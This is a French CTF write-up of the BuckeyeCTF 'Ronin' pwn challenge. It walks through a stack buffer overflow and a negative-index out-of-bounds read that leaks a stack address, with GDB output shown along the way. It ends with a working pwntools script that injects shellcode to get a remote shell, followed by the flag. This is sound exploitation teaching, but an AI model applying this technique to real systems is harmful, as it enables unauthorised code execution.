---
layout: post
author: ABE
title: "Ronin - BuckeyeCTF"
date: 2022-11-29
categories: [CTF, Pwn]
image: assets/ronin.jpg
title_color: "#ffffff"
---

Ce challenge est une exploitation de binaire. L'objectif est de détourner 
le flux d'exécution du programme pour obtenir un shell sur la machine distante et lire le flag.

## Details
- Catégorie : pwn
- Points : 271
- Résolutions : 54

### Description
A weary samurai makes his way home.
```bash
nc pwn.chall.pwnoh.io 13372
```

Le code source du binaire est fourni : 

```python
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char* txt[] = {
    "After defeating the great Haku in battle, our hero begins the journey home.\nThe forest is covered in thick brush. It is difficult to see where you are going...\nBut a samurai always knows the way home, and with a sharp sword that can cut through the foliage, there is nothing to worry about.\n...\n...suddenly, the sword is gone. It has been swept straight out of your hand!\nYou look up to see a monkey wielding your sword! What will you do? ",
    "Yes, of course. You are a great warrior! This monkey doesn't stand a chance.\nWith your inner strength, you leap to the trees, chasing the fleeing monkey for what feels like hours.\n",
    "The monkey, with great speed, quickly disappears into the trees. You have lost your sword and any hopes of getting home...\n",
    "Eventually, you lose sight of it. It couldn't have gotten far. Which way will you look? ",
    "Finally, the monkey stops and turns to you.\n\"If you wish for your weapon back, you must make me laugh.\" Holy shit. This monkey can talk. \"Tell me a joke.\" ",
    "\"BAAAAHAHAHAHAHA WOW THAT'S A GOOD ONE. YOU'RE SO FUNNY, SAMURAI.\n...NOT! THAT JOKE SUCKED!\"\nThe monkey proceeds to launch your sword over the trees. The throw was so strong that it disappeard over the horizon.\nWelp. It was a good run.\n",
};

void scroll(char* txt) {
    size_t len = strlen(txt);
    for(size_t i = 0; i < len; i++) {
        char c = txt[i];
        putchar(c);
        //usleep((c == '\n' ? 1000 : 50) * 1000);
    }
}

void encounter() {
    while(getchar() != '\n') {}
    scroll(txt[4]);
    char buf2[32];
    fgets(buf2, 49, stdin);
    scroll(txt[5]);
}

void search(char* area, int dir) {
    scroll(area);
    if(dir == 2) {
        encounter();
        exit(0);
    }
}

void chase() {
    char* locs[] = {
        "The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n",
        "Tall, thick trees surround you. You can't see a thing. Best to go back.\n",
        "You found the monkey! You continue your pursuit.\n",
        "You find a clearing with a cute lake, but nothing else. Turning around.\n",
    };
    scroll(txt[3]);
    int dir;
    while(1) {
        scanf("%d", &dir);
        if(dir > 3) {
            printf("Nice try, punk\n");
        } else {
            search(locs[dir], dir);
        }
    }
}

int main() {
    setvbuf(stdout, 0, 2, 0);

    scroll(txt[0]);
    char buf1[80];
    fgets(buf1, 80, stdin);
    if(strncmp("Chase after it.", buf1, 15) == 0) {
        scroll(txt[1]);
        chase();
    } else {
        scroll(txt[2]);
    }
}
```
C'est un binaire 64 bits (non strippé). 
```bash
file ronin
ronin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=62bd099639cad5527eade51bf2d4b75e6afaf6b1, for GNU/Linux 3.2.0, not stripped
```

## Méthodologie
### Comprendre le problème
A la lecture du code source, plusieurs problèmes peuvent être identifiés :
- un débordement de tampon dans la fonction `encounter`
  - un buffer statique de 32 octets est déclaré puis 49 octets peuvent être lus et insérés depuis stdin (à l'aide de la fonction fgets)
- Une lecture hors limite dans la fonction `chase`
  - l'utilisateur doit entrer un entier pour spécifier quelle ligne du tableau de caractères `locs` sera lue
  - il n'y a pas de vérification empêchant d'entrer une valeur négative.

Au delà de ça, le fonctionnement du programme est relativement simple et la fonction `scroll` affiche l'histoire caractère par caractère lors de l'exécution.
Cependant, les appels de fonctions pour déclencher le dépassement de tampon nécessite de donner dans l'ordre les réponses suivantes :
- "Chase after it." dans le `main`
- 2 dans la fonction `chase`
- n'importe quoi dans la fonction `encounter` pour écraser son adresse de retour stockée dans RIP

### Résoudre le problème
La première étape est d'analyser les protections du binaire :
```bash
$ checksec ronin
[*] '/home/enoent/Downloads/ronin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Il n'y a pas de bit NX (la pile est exécutable) ni de canari. Mais à ce stade, nous ne savions pas si l'ASLR était activé. 
Cependant, même s'il l'était, ce ne serait pas un problème, car nous pouvons divulguer les adresses de la pile en abusant de la lecture hors limites (OOB).

La première idée est alors d'utiliser un shellcode. Malheureusement, l'espace cible `buf2` est trop petit pour le stocker.
Toutefois, on remarque l'utilisation d'un espace mémoire de 80 octets `buf1` pour seulement stocker 15 caractères ("Chase after it.") dans le `main`.
C'est parfait ! Nous pouvons y placer notre shellcode (juste après "Chase after it.") et trouver son adresse de départ en utilisant la lecture hors limite.

Le processus est le suivant : 
- déboguer le binaire avec GDB et placer un point d'arrêt pertinent
- ajouter quelques caractères aléatoires après "Chase after it." dans `main` et obtenir le décalage entre l'adresse divulguée et ces caractères (qui, plus tard, représenteront le début de notre shellcode)

```bash
disass chase
Dump of assembler code for function chase:
   0x0000555555555367 <+0>:	endbr64 
   0x000055555555536b <+4>:	push   rbp
   0x000055555555536c <+5>:	mov    rbp,rsp
   0x000055555555536f <+8>:	sub    rsp,0x30
   0x0000555555555373 <+12>:	lea    rax,[rip+0x116e]        # 0x5555555564e8
   0x000055555555537a <+19>:	mov    QWORD PTR [rbp-0x20],rax
   0x000055555555537e <+23>:	lea    rax,[rip+0x11bb]        # 0x555555556540
   0x0000555555555385 <+30>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000555555555389 <+34>:	lea    rax,[rip+0x1200]        # 0x555555556590
   0x0000555555555390 <+41>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000555555555394 <+45>:	lea    rax,[rip+0x122d]        # 0x5555555565c8
   0x000055555555539b <+52>:	mov    QWORD PTR [rbp-0x8],rax
   0x000055555555539f <+56>:	mov    rax,QWORD PTR [rip+0x2c92]        # 0x555555558038 <txt+24>
   0x00005555555553a6 <+63>:	mov    rdi,rax
   0x00005555555553a9 <+66>:	call   0x555555555269 <scroll>
   0x00005555555553ae <+71>:	lea    rax,[rbp-0x24]
   0x00005555555553b2 <+75>:	mov    rsi,rax
   0x00005555555553b5 <+78>:	lea    rdi,[rip+0x1255]        # 0x555555556611
   0x00005555555553bc <+85>:	mov    eax,0x0
   0x00005555555553c1 <+90>:	call   0x555555555150 <__isoc99_scanf@plt>
   0x00005555555553c6 <+95>:	mov    eax,DWORD PTR [rbp-0x24]
   0x00005555555553c9 <+98>:	cmp    eax,0x3
   0x00005555555553cc <+101>:	jle    0x5555555553dc <chase+117>
   0x00005555555553ce <+103>:	lea    rdi,[rip+0x123f]        # 0x555555556614
   0x00005555555553d5 <+110>:	call   0x555555555100 <puts@plt>
   0x00005555555553da <+115>:	jmp    0x5555555553ae <chase+71>
   0x00005555555553dc <+117>:	mov    edx,DWORD PTR [rbp-0x24]
   0x00005555555553df <+120>:	mov    eax,DWORD PTR [rbp-0x24]
   0x00005555555553e2 <+123>:	cdqe   
   0x00005555555553e4 <+125>:	mov    rax,QWORD PTR [rbp+rax*8-0x20]
   0x00005555555553e9 <+130>:	mov    esi,edx
   0x00005555555553eb <+132>:	mov    rdi,rax
   0x00005555555553ee <+135>:	call   0x55555555532b <search>
   0x00005555555553f3 <+140>:	jmp    0x5555555553ae <chase+71>
```

L'assembleur de la fonction `chase` est représenté ci-dessus. Nous avons placé un point d'arrêt sur +125 où le premier paramètre de la fonction search est récupéré dans [rbp+rax*8-0x20].

```bash
0x7fffffffdc60:	0x00007fffffffde30
0x7fffffffdc68:	0x7f005555555552c8
0x7fffffffdc70:	0x0000000000000006
0x7fffffffdc78:	0x0000000000000006
0x7fffffffdc80:	0x00007fffffffdca0
0x7fffffffdc88:	0x000055555555534a
0x7fffffffdc90:	0xfffffffc00000058
0x7fffffffdc98:	0x00007fffffffdce0
0x7fffffffdca0:	0x00007fffffffdce0 -> donner la valeur -4 dans la fonction chase pour divulguer une adresse de la stack
0x7fffffffdca8:	0x00005555555553c6
0x7fffffffdcb0:	0x0000000000000000
0x7fffffffdcb8:	0xfffffffc555561c0
0x7fffffffdcc0:	0x00005555555564e8 -> address lorsque 0 est spécifié dans la fonction chase
0x7fffffffdcc8:	0x0000555555556540
0x7fffffffdcd0:	0x0000555555556590
0x7fffffffdcd8:	0x00005555555565c8
0x7fffffffdce0:	0x00007fffffffdd40 -> adresse divulguée
0x7fffffffdce8:	0x000055555555547b
0x7fffffffdcf0:	0x6661206573616843
0x7fffffffdcf8:	0x202e746920726574
0x7fffffffdd00:	0x6161616161616161 -> caractères " aaaa" insérés après "Chase after it." dans buf1
```

L'offset a pour valeur 0x41 (car nous avons inséré un espace avant les "a"). Ainsi, l'adresse de notre shellcode sera : leak_value - 0x41

### Implémentation de la solution
La solution a été implémentée en utilisant la célèbre bibliothèque Python pwntools.

```python
from pwn import *

r = remote('pwn.chall.pwnoh.io', 13372)
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')


print(r.recvuntil(b'do? '))
r.sendline(b"Chase after it." + shellcode)
print(r.recvuntil(b'look? '))
# leak stack address
r.sendline(b'-4')
# retry to read locs and continue programm execution
r.sendline(b"2")
leak = r.recvuntil(b'You', drop=True)
leak = u64(leak[-6:].ljust(8, b'\x00'))
print(r.recvuntil(b'"Tell me a joke."'))
# Send 40 bytes to overwrite RBP + shellcode address to overwrite RIP
r.sendline(b"B"*40 + p64(leak - 0x41))
r.interactive()
```
Il ne vous reste plus qu'à lire le flag :)

Flag: **buckeye{n3v3r_7ru57_4_741k1n9_m0nk3y}**
